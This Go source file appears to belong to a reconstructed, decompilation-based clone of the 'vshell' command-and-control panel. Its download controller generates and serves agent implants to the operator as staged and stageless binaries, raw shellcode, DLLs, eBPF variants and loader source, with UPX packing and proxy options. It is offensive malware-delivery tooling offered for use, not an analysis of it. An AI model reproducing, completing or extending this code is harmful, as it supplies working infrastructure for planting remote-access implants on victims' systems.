// Package controllers implements HTTP handlers for artifact download requests.
// Response formats and supported options reflect the current implementation and
// should be validated with tests rather than inferred from historical analysis.

package controllers

import (
	"net/http"

	"vshell/c2engine"
)

// DownloadController 生成/托管 Agent 载荷。
type DownloadController struct {
	ApiBaseController
}

// Stage 生成分阶段载荷（POST /download/stage）。
// 反编译证据（FUN_018dcd20）：
//
//	id = JsonGetInt("id")，arch = JsonGetStr("arch")；id==0 → "id is null"
//	（FUN_01916740）；GetListener(id)（FUN_01199040）失败 → 错误；监听器
//	mode（+0x48）仅 tcp/ws（+0x40 处的 2 字节字符串比较）→
//	"Stage support TCP/WS only"（FUN_01916b00）；随后按监听器地址建连
//	（FUN_007384c0）并把请求经隧道转发（FUN_004b1900/FUN_016dd6e0）。
//
// 原版因此是"经监听器隧道反向代理"：stage 载荷不由面板生成，而是由监听器
// 根据请求头（Expires/Pragma/public）返回已编译好的小体积客户端。
func (c *DownloadController) Stage() {
	id := c.JsonGetInt("id")
	arch := c.JsonGetStr("arch")
	binary := c.JsonGetStr("binary")
	pub := c.JsonGetBool("public")
	expires := int64(c.JsonGetInt("Expires"))
	_ = c.JsonGetStr("Pragma")
	if id == 0 {
		c.JsonErr("id is null")
		return
	}

	l := c2engine.GetEngine().GetListener(int64(id))
	if l == nil {
		c.JsonErr("listener not found")
		return
	}
	// 模式校验：仅 tcp/ws（反编译 0x18dcd20 的 +0x48/+0x40 比较）。
	switch l.Mode {
	case "tcp", "ws", "websocket", "http", "https":
	default:
		c.JsonErr("Stage support TCP/WS only")
		return
	}

	c.servePoDownload(c2engine.PoStageBuild(l, arch, binary, pub, expires))
}

// Stageless 生成无阶段载荷（POST /download/stageless）。
// 反编译（FUN_018ddca0）：
//
//	id = JsonGetInt("id")，arch = JsonGetStr("arch")，proxy = JsonGetStr("proxy")，
//	upx = JsonGetBool（FUN_018d92c0，DAT_01bd6fdd="upx"）；id==0 →
//	"id is null"（FUN_01914120，家族 A 解密链）；GetListener(id) 失败 → 错误；
//	监听器 mode==3 且协议为 dns/doh/dot 时走 DNS 分支，否则走 ARCH/UPX 分支。
//	两个分支都用 FUN_018dca00 追加 argv 条目、用 FUN_00c2a460 组装响应。
func (c *DownloadController) Stageless() {
	id := int64(c.JsonGetInt("id"))
	arch := c.JsonGetStr("arch")
	proxy := c.JsonGetStr("proxy")
	upx := c.JsonGetBool("upx")
	if id == 0 {
		c.JsonErr("id is null")
		return
	}

	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		c.JsonErr("listener not found")
		return
	}

	c.servePoDownload(c2engine.PoStagelessBuild(l, arch, proxy, upx))
}

// Listen 生成监听型载荷（POST /download/listen）。
// 反编译（FUN_018deec0）：
//
//	id = JsonGetInt("id")，host/tp/arch/vkey/salt 均为 JsonGetStr，
//	upx/ebpf 为 JsonGetBool（DAT_01bd7c11="ebpf"）；id==0 → "id is null"，
//	GetListener(id) 失败 → 错误；ebpf=false 走 FUN_01913640 分支的模板，
//	ebpf=true 走 FUN_01912ac0 的 "stageless/ebpf_%s_%s" 模板；
//	host/port/vkey/salt 由 FUN_0044a940(0, host, ":"?, ...) 拼成 argv 条目。
func (c *DownloadController) Listen() {
	id := int64(c.JsonGetInt("id"))
	host := c.JsonGetStr("host")
	port := c.JsonGetInt("port")
	tp := c.JsonGetStr("tp")
	arch := c.JsonGetStr("arch")
	vkey := c.JsonGetStr("vkey")
	salt := c.JsonGetStr("salt")
	upx := c.JsonGetBool("upx")
	ebpf := c.JsonGetBool("ebpf")
	if id == 0 {
		c.JsonErr("id is null")
		return
	}
	if host == "" || port == 0 {
		c.JsonErr("host and port required")
		return
	}

	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		c.JsonErr("listener not found")
		return
	}

	c.servePoDownload(c2engine.PoListenBuild(l, host, port, tp, arch, vkey, salt, upx, ebpf))
}

// Shellcode 生成 Shellcode 载荷（POST /download/shellcode）。
// 反编译（0x18e00e0）：
//
//	id = JsonGetInt("id")，arch = JsonGetStr("arch")，
//	binary = JsonGetStr("binary")，public = JsonGetBool("public")；id==0 →
//	"id is null"（FUN_0190e660，状态机 start=0xa seed=0xed，10 字节）；
//	GetListener(id) 失败 → 错误；监听器 mode 仅 tcp/ws →
//	"Stage support TCP/WS only"（FUN_0190ea20，25 字节）；随后与 Stage 同构
//	地经隧道反代，并由 FUN_0190e660…FUN_01912820 生成 shellcode 载荷。
//
// 前端（static/assets/v73CBtpUF.js）以浏览器导航方式请求：
//
//	/download/shellcode?arch=<arch>&id=<id>
//
// 因此 handler 直接返回 shellcode 字节流（原版以二进制响应返回，
// 注释里提到的 "d903" 魔数与 "\x%x" 十六进制格式化属于旧实现的猜测，
// 反编译 FUN_00c2a460 显示实际是 binary 字节 + Expires/Pragma 头）。
func (c *DownloadController) Shellcode() {
	id := int64(c.JsonGetInt("id"))
	arch := c.JsonGetStr("arch")
	binary := c.JsonGetStr("binary")
	pub := c.JsonGetBool("public")
	_ = int64(c.JsonGetInt("Expires"))
	_ = c.JsonGetStr("Pragma")
	if id == 0 {
		c.JsonErr("id is null")
		return
	}

	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		c.JsonErr("listener not found")
		return
	}
	switch l.Mode {
	case "tcp", "ws", "websocket", "http", "https":
	default:
		c.JsonErr("Stage support TCP/WS only")
		return
	}

	c.servePoDownload(c2engine.PoShellcodeBuild(l, arch, binary, pub))
}

// Dll 生成 DLL 载荷（POST /download/dll）。
// 反编译（FUN_018e2460）：id / arch / binary / public / Expires / Pragma /
// upx / vip / proxy；id==0 或 arch=="" → "id error"。
func (c *DownloadController) Dll() {
	id := int64(c.JsonGetInt("id"))
	arch := c.JsonGetStr("arch")
	binary := c.JsonGetStr("binary")
	pub := c.JsonGetBool("public")
	_ = int64(c.JsonGetInt("Expires"))
	_ = c.JsonGetStr("Pragma")
	upx := c.JsonGetBool("upx")
	vip := c.JsonGetBool("vip")
	proxy := c.JsonGetStr("proxy")
	if id == 0 || arch == "" {
		c.JsonErr("id error")
		return
	}

	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		c.JsonErr("listener not found")
		return
	}

	c.servePoDownload(c2engine.PoDllBuild(l, arch, binary, pub, upx, vip, proxy))
}

// ListenDll 生成监听型 DLL 载荷（POST /download/listendll）。
// 反编译（FUN_018e3760）：id / host / tp / arch / vkey / salt / upx；
// 与 Listen 共用 FUN_01913320 / FUN_019134a0 家族的载荷串。
//
// 前端（static/assets/vbw5Ta7i0.js）还会以 arch=loader 请求 Go 源码
// loader.go（"下载 Loader"按钮），此处按原版返回 loader 源码骨架。
func (c *DownloadController) ListenDll() {
	host := c.JsonGetStr("host")
	port := c.JsonGetInt("port")
	tp := c.JsonGetStr("tp")
	arch := c.JsonGetStr("arch")
	vkey := c.JsonGetStr("vkey")
	salt := c.JsonGetStr("salt")
	upx := c.JsonGetBool("upx")
	id := int64(c.JsonGetInt("id"))

	// arch=loader：前端"下载 Loader"分支，返回 loader 源码。
	if arch == "loader" {
		c.servePoDownload(c2engine.PoLoaderSource())
		return
	}

	if id == 0 {
		c.JsonErr("id is null")
		return
	}
	if host == "" || port == 0 {
		c.JsonErr("host and port required")
		return
	}

	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		c.JsonErr("listener not found")
		return
	}

	c.servePoDownload(c2engine.PoListenDllBuild(l, host, port, tp, arch, vkey, salt, upx))
}

// servePoDownload 按原版 FUN_00c2a460 / FUN_00c28a40 的语义输出下载响应：
// body = 模板字节 + 配置块 + argv 条目，响应头 = Expires / Pragma / public。
//
// ⚠ 这里是**故意**不回 JsonOkResult 的：/download/* 是浏览器导航式下载
// （内嵌 SPA 用 target:"_self" 触发，不是 axios 的 url: 映射），原版由
// FUN_00c2a460 直接写二进制 body，并由 FUN_00c28a40 设
// "Content-Disposition" / "Content-Type" 两个响应头（这两个 32 字节 Hex 常量
// 已逐字节解码确认）。原版没有 JSON 信封，因此**不要**把这些 handler
// "修回"成 JsonOkResult——那会破坏前端下载。
//
// ⚠ These handlers deliberately answer with a FILE, not a JsonOkResult envelope.
// The embedded SPA fetches them as plain browser navigations, and the original's
// FUN_00c2a460 writes a raw binary body while FUN_00c28a40 sets
// Content-Disposition / Content-Type. Do not "fix" this back to JSON.
//
// servePoDownload emits the original download shape: a raw body plus the
// Expires / Pragma headers set by FUN_00c28a40.
func (c *DownloadController) servePoDownload(p *c2engine.PoPayload) {
	if p == nil {
		c.JsonErr("listener not found")
		return
	}

	// 反编译 FUN_00c28a40 设置的头：
	//   DAT_01bdac68="Expires" + 值 span{0,0x330}
	//   DAT_01bd97d9="Pragma"  + DAT_01bda44b="public"
	//   Content-Disposition: attachment; filename=<名字>
	//   Content-Type: 见 PoPayload.MimeType
	w := c.Ctx.ResponseWriter
	w.Header().Set("Expires", "0")
	w.Header().Set("Pragma", "public")
	w.Header().Set("Content-Disposition", "attachment; filename="+p.Filename)
	w.Header().Set("Content-Type", p.MimeType)
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(p.Data)
}
